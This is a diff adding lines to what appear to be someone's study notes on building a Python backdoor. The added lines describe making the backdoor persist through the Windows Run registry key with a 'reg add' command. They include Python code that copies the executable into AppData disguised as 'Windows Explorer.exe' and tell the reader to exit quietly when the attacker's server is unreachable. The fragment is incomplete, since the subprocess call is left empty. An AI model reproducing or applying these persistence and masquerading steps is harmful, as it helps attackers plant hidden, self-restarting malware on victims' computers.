@@ -578,6 +578,15 @@ we instantiate the object of the class and call it, just mention the second file
 dependent imports will be taken care by pyinstaller. 
 persistence - program automatically executes on reboot. ie need to edit registry values using regedit. hkey_current_user>software>
 microsoft>windows>current_version>run (will show the entries at startup)
+reg add /?  -- for help
+reg add HKCU\software\microsoft\windows\current_version\run \v test \t REG_SZ /d "C:\test.exe"
+using subprocess call to execute the above command. but backdoor will try and execute everytime system reboots and tries to connect
+with attacker but will throw error if server is non-reachable hence try in the code block to sys.exit() in case connection 
+unable to be established. 
+evil_file_loaction = os.environ['AppData'] + '\\Windows Explorer.exe'
+if not os.path.exists(evil_file_loaction):
+        shutil.copyfile(sys.executable,evil_file_loaction)    # __file__ as source if we were using the .py file itself instead of to be packaged exe
+        subprocess.call()  # put the reg add command with evil_file_location
 
 
 
